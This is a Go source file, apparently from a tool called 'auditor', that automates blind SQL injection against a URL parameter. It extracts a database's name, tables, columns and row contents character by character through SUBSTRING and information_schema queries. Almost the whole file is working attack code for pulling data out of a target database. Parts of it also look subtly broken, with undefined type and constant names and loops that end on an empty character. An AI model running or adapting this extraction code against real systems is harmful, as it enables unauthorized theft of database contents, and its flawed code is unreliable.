package sql

import (
	"auditor/core/utils"
	"auditor/entities"
	"auditor/payloads/intruder/detect"
	"fmt"
	"log"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

type SQLIType int

const (
	intruder   string   = "/handlers/sql/Intruder"
	ErrorBased SQLIType = iota
	SQLIBased
	TimeBased
	UnionBased
	BlindBased
)

func validateByMethod(query string, method SQLiBased) int {
	u := *options.URL
	q := u.Query()
	q.Set(options.Parameter, options.ParameterValue+query)
	u.RawQuery = q.Encode()

	switch method {
	case LengthValidation:
		secondLen := utils.GetPageLength(u.String(), options.Cookie)
		if options.PageLength == secondLen {
			return 1
		}
		return 0

	case ErrorSQLiBased:
		html := utils.GetPageHTML(u.String(), options.Cookie)
		for _, valueErr := range detect.ErrPayloads {
			if !strings.Contains(html, valueErr) {
				return 1
			}
		}
		return 0
	}
	return 0
}

func generatePwnQuery(query string) string {
	payload := detect.Payloads

	splitPayload := strings.Split(payload[options.Payload], "AND")
	generatedPayload := splitPayload[0] + query + " AND" + splitPayload[1]
	return generatedPayload
}

func validatePwnType() SQLiBased {
	if validateByMethod("'", LengthValidation) == 0 && validateByMethod("'", ErrorSQLiBased) == 0 {
		return BetweenSQLiBased
	}
	if validateByMethod("'", LengthValidation) == 0 {
		return LengthValidation
	}
	if validateByMethod("'", ErrorSQLiBased) == 0 {
		return ErrorSQLiBased
	}
	return UnkownBased
}

func (s *Service) fetchDBNameLength(method SQLiBased) {
	if options.ValidateProc(entities.NameLength) {
		return
	}
	color.Green("\n[*] Start fetchDBNameLength()")

	p := "AND (SELECT LENGTH(database()))="
	for i := 3; i < 32; i++ {
		f := fmt.Sprintf("%s%s", p, strconv.Itoa(i))

		query := generatePwnQuery(f)
		if validateByMethod(query, method) == 1 {
			options.NameLength = i
			color.Green("\n[FOUND] Database Name Length: %d", i)
			break
		}
	}
	s.rp.Update(options)
}

func (s *Service) fetchDBName(method SQLiBased) {
	if options.ValidateProc(entities.Name) {
		return
	}

	char := 1
	for {
		for _, c := range detect.Characters {
			f := fmt.Sprintf("%s%s%s%s%s",
				"AND (SUBSTRING(DATABASE(),",
				strconv.Itoa(char),
				",1))='",
				c,
				"'",
			)

			query := generatePwnQuery(f)
			if validateByMethod(query, method) == 1 {
				char++
				options.Name += c
				break
			}
		}
		if char == (options.NameLength + 1) {
			color.Green("[FOUND] DB Name: %s", options.Name)
			break
		}
	}
	s.rp.Update(options)
}

func (s *Service) fetchDBTableCount(method SQLiBased) {
	if options.ValidateProc(entities.TableCount) {
		return
	}

	i := 0
	for {
		query := generatePwnQuery("AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=" + strconv.Itoa(i))
		if validateByMethod(query, method) == 1 {
			color.Green("[FOUND] Table Count: %d", i)
			options.TableCount = i
			break
		}
		i++
	}
	s.rp.Update(options)
}

func (s *Service) fetchDBTables(method SQLiBased) {
	if options.ValidateProc(entities.Tables) {
		return
	}

	color.Yellow("[INFO] Retrieving tables..")
	fmt.Print("[RETRIEVE] ")
	char := 1
	table := 0
	tableName := ""

	for {
		for _, value := range detect.Characters {
			value = strings.ToLower(value)
			query := generatePwnQuery(
				"and substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit " +
					strconv.Itoa(table) +
					",1)," +
					strconv.Itoa(char) +
					",1)='" +
					value +
					"'")

			if validateByMethod(query, method) == 1 {
				char++
				tableName += value
				fmt.Print(value)
				if value == "" {
					fmt.Println("")
					color.Green("[FOUND] Table[%d/%d] Name: %s",
						(table + 1), options.TableCount, tableName,
					)
					fmt.Print("[RETRIEVE] ")
					char = 1
					options.Columns[tableName] = []string{}
					tableName = ""
					table++
				}
			}
		}
		if options.TableCount == table {
			break
		}
	}

	s.rp.Update(options)
}

func (s *Service) goFetchDBTables(method SQLiBased, tableNo int) {
	if options.TableCount == len(options.Columns) {
		return
	}

	color.Yellow("[INFO] Retrieving tables..")
	fmt.Println("[RETRIEVE] table number: ", tableNo)
	char := 1
	tableName := ""
	var done bool
	for !done {
		for _, value := range detect.Characters {
			value = strings.ToLower(value)
			query := generatePwnQuery(
				"and substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit " +
					strconv.Itoa(tableNo) +
					",1)," +
					strconv.Itoa(char) +
					",1)='" +
					value +
					"'")

			if validateByMethod(query, method) == 1 {
				char++
				tableName += value
				fmt.Print(value)
				if value == "" {
					fmt.Println("")
					color.Green("[FOUND] Table[%d/%d] Name: %s",
						(tableNo + 1), options.TableCount, tableName,
					)
					char = 1
					options.Columns[tableName] = []string{}
					done = true
				}
			}
		}
	}
	fmt.Print("[RETRIEVE] table done")
}

func fetchData(method SQLiBased, tableName string, column string, row int) string {
	char := 1
	rowData := ""
	for {
		for _, a := range detect.Characters {
			query := generatePwnQuery("and substring((Select " + column + " from " + tableName + " limit " + strconv.Itoa(row) + ",1)," + strconv.Itoa(char) + ",1)='" + a + "'")
			if validateByMethod(query, method) == 1 {
				rowData += a
				char++
				if a == "" {
					return rowData
				}
			}
		}
	}
}

func getDBRowCount(method SQLiBased, tableName string, column string) int {
	i := 0
	for {
		query := generatePwnQuery("AND (SELECT COUNT(*) FROM " + tableName + ") = " + strconv.Itoa(i))
		if validateByMethod(query, method) == 1 {
			return i
		}
		i++
	}
}

func getDBRows(method SQLiBased, tableName string) {
	color.Yellow("[INFO] Retrieving rows of table %s ", tableName)
	row := 0
	rowData := ""
	rowCount := 0
	for {
		for _, column := range options.Columns[tableName] {
			rowCount = getDBRowCount(method, tableName, column)
			rowData = fetchData(method, tableName, column, row)
			options.Rows[row] = append(options.Rows[row], rowData)

		}
		fmt.Println(options.Rows[row])
		rowData = ""
		row++
		if row == rowCount {
			break
		}
	}
}

func fetchDBColumnLen(method SQLiBased, tableName string) int {
	color.Yellow("[INFO] Retrieving column count of table %s", tableName)
	for i := 1; i < 32; i++ {
		query := generatePwnQuery("AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='" + tableName + "')=" + strconv.Itoa(i))
		if validateByMethod(query, method) == 1 {
			color.Green("[FOUND] %d columns in table %s", i, tableName)
			return i
		}
	}
	return 0
}

func (s *Service) fetchColumnsName(method SQLiBased, tableName string) {
	if options.ValidateProc(entities.ColumnsName) {
		return
	}

	color.Yellow("[INFO] Retrieving columns of table %s", tableName)
	columnLen := fetchDBColumnLen(method, tableName)
	char := 1
	columnName := ""
	for column := 0; column < columnLen; {
		for _, a := range detect.Characters {
			query := generatePwnQuery(
				"AND (substr((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='" +
					tableName +
					"' LIMIT " +
					strconv.Itoa(column) +
					",1)," +
					strconv.Itoa(char) +
					",1)) = '" +
					a +
					"'",
			)
			if validateByMethod(query, method) == 1 {
				columnName += a
				if a == "" {
					log.Println("===================")
					log.Println(tableName, columnName)
					log.Println("===================")
					options.Columns[tableName] = append(options.Columns[tableName], columnName)
					columnName = ""
					column++
					char = 0
				}
				char++
			}
		}
	}
	s.rp.Update(options)
}
